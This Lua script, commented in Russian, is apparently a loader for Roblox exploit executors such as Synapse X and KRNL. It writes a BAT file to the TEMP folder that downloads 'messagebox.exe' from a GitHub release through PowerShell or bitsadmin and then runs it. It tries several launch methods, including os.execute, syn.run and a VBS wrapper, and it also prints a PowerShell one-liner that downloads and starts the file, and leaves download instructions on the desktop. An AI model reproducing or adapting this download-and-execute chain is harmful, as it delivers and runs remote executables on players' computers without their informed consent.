-- ==============================================
-- ЗАГРУЗЧИК С ПОЛНОЙ ОТЛАДКОЙ И ПРОВЕРКОЙ КАЖДОГО ШАГА
-- ==============================================

local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"
local debugMode = true  -- Включить подробные сообщения

-- Функция для отладочных сообщений
local function DebugLog(message)
    if debugMode then
        print("[DEBUG] " .. message)
    end
end

-- Функция для уведомлений
local function ShowNotification(title, text, duration)
    DebugLog("Уведомление: " .. title .. " - " .. text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 5
    })
end

-- ==============================================
-- ШАГ 1: НАЧАЛО РАБОТЫ
-- ==============================================
ShowNotification("🚀 ЗАГРУЗЧИК", "Начинаю работу...", 3)
DebugLog("Загрузчик запущен")
DebugLog("Используется ссылка: " .. EXE_URL)

wait(2)

-- ==============================================
-- ШАГ 2: ПРОВЕРКА ДОСТУПНОСТИ ССЫЛКИ
-- ==============================================
ShowNotification("🔗 ПРОВЕРКА ССЫЛКИ", "Тестирую соединение...", 3)

local urlCheckSuccess = false
local fileSize = 0

spawn(function()
    local success, result = pcall(function()
        DebugLog("Пытаюсь получить информацию о файле...")
        
        if syn and syn.request then
            DebugLog("Использую syn.request для проверки")
            local req = syn.request({
                Url = EXE_URL,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0"
                }
            })
            
            if req.Success and req.Body then
                urlCheckSuccess = true
                fileSize = #req.Body
                DebugLog("Успешно! Размер файла: " .. fileSize .. " байт")
                return "✅ Ссылка работает (" .. fileSize .. " байт)"
            else
                DebugLog("Ошибка HTTP: " .. tostring(req.StatusCode))
                return "❌ Ошибка: " .. tostring(req.StatusCode)
            end
            
        else
            DebugLog("Использую game:HttpGet для проверки")
            local content = game:HttpGet(EXE_URL, true)
            if content and #content > 0 then
                urlCheckSuccess = true
                fileSize = #content
                DebugLog("Успешно! Размер файла: " .. fileSize .. " байт")
                return "✅ Ссылка работает (" .. fileSize .. " байт)"
            else
                DebugLog("Получен пустой ответ")
                return "❌ Получен пустой ответ"
            end
        end
    end)
    
    wait(2)
    
    if success then
        ShowNotification("🔗 РЕЗУЛЬТАТ ПРОВЕРКИ", result, 5)
        DebugLog("Результат проверки: " .. result)
    else
        ShowNotification("🔗 ОШИБКА ПРОВЕРКИ", "Не удалось проверить ссылку", 5)
        DebugLog("Ошибка при проверке: " .. tostring(result))
    end
end)

wait(4)

-- ==============================================
-- ШАГ 3: ПРОВЕРКА ВОЗМОЖНОСТИ СОЗДАВАТЬ ФАЙЛЫ
-- ==============================================
ShowNotification("📁 ПРОВЕРКА ФАЙЛОВОЙ СИСТЕМЫ", "Проверяю доступ к файлам...", 3)

local canWriteFiles = false
local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
DebugLog("Temp путь: " .. tempPath)

if writefile then
    DebugLog("writefile функция доступна")
    local testFile = tempPath .. "\\test.txt"
    
    local success, err = pcall(function()
        writefile(testFile, "test")
        canWriteFiles = true
        DebugLog("Файл успешно создан: " .. testFile)
        
        -- Пробуем удалить тестовый файл
        if delfile then
            delfile(testFile)
            DebugLog("Тестовый файл удален")
        end
    end)
    
    if not success then
        DebugLog("Ошибка при записи файла: " .. tostring(err))
    end
else
    DebugLog("writefile функция НЕДОСТУПНА")
end

wait(2)

if canWriteFiles then
    ShowNotification("✅ ДОСТУП К ФАЙЛАМ", "Могу создавать файлы", 3)
else
    ShowNotification("❌ ДОСТУП К ФАЙЛАМ", "Не могу создавать файлы", 3)
end

-- ==============================================
-- ШАГ 4: СОЗДАНИЕ BAT ФАЙЛА ДЛЯ СКАЧИВАНИЯ
-- ==============================================
ShowNotification("📝 СОЗДАНИЕ СКРИПТА", "Готовлю команды для скачивания...", 3)

local batPath = tempPath .. "\\download.bat"
local batCreated = false

if canWriteFiles then
    local batScript = [[
@echo off
chcp 65001 >nul
title Скачивание программы
color 0A
cls

echo ========================================
echo          СИСТЕМНОЕ СКАЧИВАНИЕ
echo ========================================
echo.

echo [1/3] Создаю папку для загрузки...
set "DOWNLOAD_DIR=%TEMP%\RobloxDownload"
mkdir "%DOWNLOAD_DIR%" 2>nul
cd /d "%DOWNLOAD_DIR%"

echo [2/3] Скачиваю файл...
echo.
echo URL: ]] .. EXE_URL .. [[
echo.

powershell -Command "
try {
    $url = ']] .. EXE_URL .. [['
    $output = 'messagebox.exe'
    
    Write-Host 'Начинаю загрузку...' -ForegroundColor Yellow
    (New-Object System.Net.WebClient).DownloadFile($url, $output)
    
    if (Test-Path $output) {
        $size = (Get-Item $output).Length
        Write-Host 'Успешно! Файл скачан.' -ForegroundColor Green
        Write-Host 'Размер: ' $size 'байт' -ForegroundColor Cyan
        Write-Host 'Путь: ' (Get-Item $output).FullName -ForegroundColor Cyan
        exit 0
    } else {
        Write-Host 'Ошибка: файл не создан' -ForegroundColor Red
        exit 1
    }
} catch {
    Write-Host 'Ошибка: ' $_.Exception.Message -ForegroundColor Red
    exit 1
}
"

if errorlevel 1 (
    echo.
    echo Использую альтернативный метод...
    bitsadmin /transfer "DownloadJob" ]] .. EXE_URL .. [[ "%DOWNLOAD_DIR%\messagebox.exe"
)

if exist "messagebox.exe" (
    echo.
    echo ========================================
    echo          ✅ СКАЧИВАНИЕ УСПЕШНО
    echo ========================================
    echo.
    echo [3/3] Запускаю программу...
    echo.
    start "" "messagebox.exe"
    
    echo Программа запущена!
    echo Проверьте панель задач или системный трей.
    echo.
    echo Эта консоль закроется через 10 секунд...
    timeout /t 10 /nobreak >nul
) else (
    echo.
    echo ========================================
    echo          ❌ СКАЧИВАНИЕ НЕ УДАЛОСЬ
    echo ========================================
    echo.
    echo Не удалось скачать файл.
    echo.
    echo Скачайте вручную:
    echo ]] .. EXE_URL .. [[
    echo.
    echo Нажмите любую клавишу для выхода...
    pause >nul
)

exit
]]
    
    local success, err = pcall(function()
        writefile(batPath, batScript)
        batCreated = true
        DebugLog("BAT файл создан: " .. batPath)
        ShowNotification("✅ BAT ФАЙЛ", "Скрипт создан успешно", 3)
    end)
    
    if not success then
        DebugLog("Ошибка создания BAT файла: " .. tostring(err))
        ShowNotification("❌ BAT ФАЙЛ", "Не удалось создать скрипт", 3)
    end
else
    DebugLog("Невозможно создать BAT файл (нет доступа к записи)")
    ShowNotification("⚠️ BAT ФАЙЛ", "Нет прав для создания файлов", 3)
end

wait(2)

-- ==============================================
-- ШАГ 5: ЗАПУСК СКАЧИВАНИЯ
-- ==============================================
ShowNotification("🚀 ЗАПУСК СКАЧИВАНИЯ", "Пытаюсь запустить процесс...", 3)

local downloadStarted = false
local launchMethod = "неизвестно"

if batCreated then
    DebugLog("Пробую запустить BAT файл...")
    
    -- Метод 1: Для Synapse X
    if syn and syn.run then
        DebugLog("Использую syn.run для запуска")
        syn.run('start "" "' .. batPath .. '"')
        downloadStarted = true
        launchMethod = "Synapse"
        DebugLog("Запущено через syn.run")
        
    -- Метод 2: Для KRNL и других через os.execute
    elseif os.execute then
        DebugLog("Использую os.execute для запуска")
        local success = pcall(function()
            os.execute('start "" "' .. batPath .. '"')
        end)
        
        if success then
            downloadStarted = true
            launchMethod = "os.execute"
            DebugLog("Запущено через os.execute")
        else
            DebugLog("Ошибка при os.execute")
        end
        
    -- Метод 3: Для всех остальных
    else
        DebugLog("Пробую создать VBS для запуска BAT")
        local vbsScript = 'Set objShell = CreateObject("WScript.Shell")\n'
        vbsScript = vbsScript .. 'objShell.Run """' .. batPath .. '""", 1, False\n'
        
        local vbsPath = tempPath .. "\\launch.vbs"
        
        if writefile then
            writefile(vbsPath, vbsScript)
            
            if syn and syn.run then
                syn.run('wscript.exe "' .. vbsPath .. '"')
                downloadStarted = true
                launchMethod = "VBS + syn.run"
                DebugLog("Запущено через VBS")
            end
        end
    end
end

wait(3)

-- ==============================================
-- ШАГ 6: ПРОВЕРКА РЕЗУЛЬТАТА
-- ==============================================
if downloadStarted then
    ShowNotification("✅ ПРОЦЕСС ЗАПУЩЕН", 
        "Скачивание началось\nМетод: " .. launchMethod, 
        5)
    DebugLog("Процесс скачивания запущен успешно")
    
    -- Проверка через 10 секунд
    spawn(function()
        wait(10)
        ShowNotification("🔍 ПРОВЕРКА СТАТУСА", 
            "Через 10 секунд\nПроверьте загрузку", 
            5)
    end)
    
    print("\n" .. string.rep("=", 60))
    print("✅ СКАЧИВАНИЕ ЗАПУЩЕНО!")
    print("Метод запуска: " .. launchMethod)
    print("BAT файл: " .. batPath)
    print("\nЧто должно произойти:")
    print("1. Откроется черное окно CMD")
    print("2. Начнется загрузка файла")
    print("3. После загрузки программа запустится")
    print("4. Окно закроется автоматически")
    print(string.rep("=", 60))
    
else
    ShowNotification("❌ НЕ УДАЛОСЬ ЗАПУСТИТЬ", 
        "Автоматический запуск не сработал", 
        5)
    DebugLog("Не удалось запустить процесс скачивания")
    
    print("\n" .. string.rep("=", 60))
    print("❌ АВТОМАТИЧЕСКИЙ ЗАПУСК НЕ УДАЛСЯ")
    print("\nПричины:")
    print("1. Нет доступа к запуску внешних программ")
    print("2. Исполнитель блокирует системные вызовы")
    print("3. Антивирус блокирует запуск")
    print("\nВам нужно скачать вручную:")
    print("Ссылка: " .. EXE_URL)
    print(string.rep("=", 60))
end

-- ==============================================
-- ШАГ 7: СОЗДАНИЕ РУЧНОГО ИНСТРУКЦИИ
-- ==============================================
wait(5)

ShowNotification("📋 ИНСТРУКЦИЯ", 
    "Если ничего не произошло\nследуйте инструкциям ниже", 
    7)

print("\n" .. string.rep("=", 60))
print("📋 РУЧНАЯ ИНСТРУКЦИЯ ПО СКАЧИВАНИЮ:")
print(string.rep("=", 60))

if batCreated then
    print("Способ 1: Запустите BAT файл вручную")
    print("1. Откройте папку: " .. tempPath)
    print("2. Найдите файл: download.bat")
    print("3. Запустите его двойным кликом")
    print("4. Следуйте инструкциям в окне")
    print()
end

print("Способ 2: Скачайте напрямую через браузер")
print("1. Скопируйте ссылку:")
print("   " .. EXE_URL)
print("2. Вставьте в адресную строку браузера")
print("3. Скачайте файл messagebox.exe")
print("4. Запустите скачанный файл")
print()

print("Способ 3: Используйте PowerShell")
print("1. Нажмите Win + R")
print("2. Введите: powershell")
print("3. Вставьте команду:")
local psCommand = "(New-Object Net.WebClient).DownloadFile('" .. EXE_URL .. "', '$env:TEMP\\messagebox.exe'); Start-Process '$env:TEMP\\messagebox.exe'"
print("   " .. psCommand)
print(string.rep("=", 60))

-- ==============================================
-- ШАГ 8: СОЗДАНИЕ ФАЙЛА С ИНСТРУКЦИЯМИ
-- ==============================================
if canWriteFiles then
    local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
    local instructions = [[
ИНСТРУКЦИЯ ПО СКАЧИВАНИЮ messagebox.exe

1. ССЫЛКА ДЛЯ СКАЧИВАНИЯ:
   ]] .. EXE_URL .. [[

2. КАК СКАЧАТЬ:
   а) Откройте ссылку в браузере
   б) Сохраните файл messagebox.exe
   в) Запустите скачанный файл

3. АЛЬТЕРНАТИВНЫЙ СПОСОБ:
   Запустите файл ]] .. tempPath .. [[\download.bat
   Это автоматически скачает и запустит программу.

4. КОМАНДА ДЛЯ POWERSHELL (если не работает):
   Откройте PowerShell и введите:
   ]] .. psCommand .. [[

Дата создания: ]] .. os.date("%d.%m.%Y %H:%M:%S") .. [[

    ]]
    
    local instructionsPath = desktop .. "\\скачать_messagebox.txt"
    pcall(function()
        writefile(instructionsPath, instructions)
        DebugLog("Файл с инструкциями создан: " .. instructionsPath)
        ShowNotification("📄 ИНСТРУКЦИЯ НА РАБОЧЕМ СТОЛЕ", 
            "Файл: скачать_messagebox.txt", 
            5)
    end)
end

-- ==============================================
-- ШАГ 9: ФИНАЛЬНЫЙ ОТЧЕТ
-- ==============================================
wait(3)

ShowNotification("📊 ФИНАЛЬНЫЙ ОТЧЕТ", 
    "Проверьте консоль для деталей", 
    5)

print("\n" .. string.rep("=", 60))
print("📊 ФИНАЛЬНЫЙ ОТЧЕТ ЗАГРУЗЧИКА")
print(string.rep("=", 60))
print("Статус проверки ссылки: " .. (urlCheckSuccess and "✅ РАБОТАЕТ" or "❌ НЕ РАБОТАЕТ"))
print("Доступ к файлам: " .. (canWriteFiles and "✅ ЕСТЬ" or "❌ НЕТ"))
print("BAT файл создан: " .. (batCreated and "✅ ДА" or "❌ НЕТ"))
print("Скачивание запущено: " .. (downloadStarted and "✅ ДА" or "❌ НЕТ"))
if downloadStarted then
    print("Метод запуска: " .. launchMethod)
end
print("\nРекомендуемое действие:")
if downloadStarted then
    print("Ждите завершения загрузки в открывшемся окне")
else
    print("Скачайте файл вручную по ссылке выше")
end
print(string.rep("=", 60))

-- ==============================================
-- ШАГ 10: КОМАНДЫ ДЛЯ ЧАТА
-- ==============================================
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    msg = msg:lower()
    
    if msg == "/status" then
        print("\n" .. string.rep("=", 40))
        print("СТАТУС ЗАГРУЗКИ:")
        print("Ссылка: " .. (urlCheckSuccess and "РАБОТАЕТ" or "НЕ РАБОТАЕТ"))
        print("Файлы: " .. (canWriteFiles and "МОГУ" or "НЕ МОГУ"))
        print("Запуск: " .. (downloadStarted and "УСПЕШНО" or "НЕ УДАЛОСЬ"))
        if downloadStarted then
            print("Метод: " .. launchMethod)
        end
        print("Ссылка: " .. EXE_URL)
        print(string.rep("=", 40))
        
    elseif msg == "/link" then
        print("🔗 Ссылка для скачивания: " .. EXE_URL)
        ShowNotification("🔗 ССЫЛКА", EXE_URL, 7)
        
    elseif msg == "/help" then
        print("\nДоступные команды:")
        print("/status - статус загрузки")
        print("/link - показать ссылку")
        print("/help - эта справка")
    end
end)

print("\n💬 Команды в чате Roblox:")
print("/status - статус загрузки")
print("/link - показать ссылку")
print("/help - помощь")

-- ==============================================
-- ЗАВЕРШЕНИЕ
-- ==============================================
DebugLog("Загрузчик завершил работу")
print("\n✅ Загрузчик завершил работу в " .. os.date("%H:%M:%S"))
print("📁 Проверьте рабочий стол и TEMP папку для файлов")
